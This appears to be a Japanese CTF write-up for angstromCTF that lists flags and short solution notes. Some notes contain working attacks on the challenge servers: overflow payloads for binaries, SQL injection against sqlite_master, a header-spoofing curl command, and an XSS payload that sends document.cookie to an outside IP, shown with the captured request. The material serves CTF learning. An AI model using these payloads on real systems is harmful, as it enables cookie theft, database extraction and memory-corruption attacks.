# misc
## Sanity Check
discordのgeneralチャンネルの説明文
actf{always_gonna_give_you_up}

## Archaic
tar -xzvfするだけ。
actf{thou_hast_uncovered_ye_ol_fleg}

## fish
青空白猫で「アルファチャンネルを無効化」
actf{in_the_m0rning_laughing_h4ppy_fish_heads_in_th3_evening_float1ng_in_your_soup}

## Float On
0, 9221120237041090559, 9218868437227405312, 9209861237972664320, 9221120237041090559
actf{well_we'll_float_on,_big_points_are_on_the_way}

## Survey
actf{roly_poly_fish_heads_are_never_seen_drinking_cappuccino_in_italian_restaurants_with_oriental_women_yeah}

# crypto
## Relatively Simple Algorithm
actf{old_but_still_good_well_at_least_until_quantum_computing}

## Exclusive Cipher
Congratulations on decrypting the message! The flag is actf{who_needs_aes_when_you_have_xor}. Good luck on the other crypto!'
actf{who_needs_aes_when_you_have_xor}

## Keysar v2
単一換字式なので、頻出する"b'r" とかから気合で頑張る
actf{keyedcaesarmorelikesubstitution}

## sosig
wiener's attack
actf{d0ggy!!!111!1}

## Home Rolled Crypto
actf{no_bit_shuffling_is_trivial}

## Follow the Currents
それっぽいのがでてくる
there are like 30 minutes left before the ctf starts so i have no idea what to put here other than the flag which is actf{low_entropy_keystream}
actf{low_entropy_keystream}

## I'm so Random
二つのgeneratorの初期値の組を条件に合うように全探索して間に合う
actf{middle_square_method_more_like_middle_fail_method}

## Substitution
actf{polynomials_20a829322766642530cf69}

## Oracle of Blair
actf{cbc_more_like_ecb_c}

# rev
## free flags!!1!!
31337 → 419 723 (=302937) → banana
actf{what_do_you_mean_bananas_arent_animals}

## Revex
actf{reGEx_1s_b3stEx_qzuy}

# binary
## secure_login
for ((i=0;i<1000;i++)); do
    echo -e '\x00' | ./login
done
をすると1/256くらいの確率で当たる
actf{if_youre_reading_this_ive_been_hacked}

## tranquil
echo -e 'password123\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x11\x40\x00' | ./tranquil
actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}

## sanity checks
echo -e 'password123\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x11\x00\x00\x00\x3d\x00\x00\x00\xf5\x00\x00\x00\x37\x00\x00\x00\x32\x00\x00\x00' | ./checks
actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}

## stickystacks
actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}

# web
## Jar
actf{you_got_yourself_out_of_a_pickle}

## Sea of Quills
"select %s from quills limit %s offset %s"

1,1,name from sqlite_master union all select url,desc,name  -> quills/flagtable が見える

tbl_name,rootpage,sql from sqlite_master union all select url,desc,name
- quills / 2 / CREATE TABLE quills ( url varchar(30), name varchar(30), desc varchar(30) )
- flagtable / 3 / CREATE TABLE flagtable ( flag varchar(30) )

1,1,sql from sqlite_master union all select url,desc,name  -> CREATE TABLE flagtable ( flag varchar(30) )
1,1,flag from flagtable union all select url,desc,name  -> actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}
actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}

## nomnomnom
- <script src="data:text/javascript,location.href='http://118.27.22.223:11111?cookie='+encodeURIComponent(document.cookie);"
  - https://techblog.securesky-tech.com/entry/2020/05/21/

```
GET /?cookie=no_this_is_not_the_challenge_go_away%3Dfb2ec42eec1c34187dc9153cb385e46b04a8daecb3838e8edb5226c6be8a53f4a8d377509ed0546fa0410ea66a638b71c61cc4b834a19521b15388590d97b9ca HTTP/1.1
Host: 118.27.22.223:11111
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:9999/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```
actf{w0ah_the_t4g_n0mm3d_th1ng5}

## Reaction.py
flask.escape ... &, <, >, ‘, ”
<div style="color:expression(alert('XSS'));">a</div>

<p>Welcome <strong>iii</strong>!</p><p>All letters: <div style="cor:xpn(a'XS);>/<br>Most frequent: 'e'x4</p><script src="https://www.google.com/recaptcha/api.js" async defer></script></body>
</html>


## Sea of Quills 2
colが24文字以下、["-", "/", ";", "'", "\"", "flag"]なし

* from Flagtable%00

actf{the_time_we_have_spent_together_riding_through_this_english_denylist_c0776ee734497ca81cbd55ea}

## Spoofy
echo -e '\x00' | curl -H 'X-Forwarded-For:1.3.3.7$1' https://actf-spoofy.herokuapp.com/

echo AA(echo -e '\x41')AA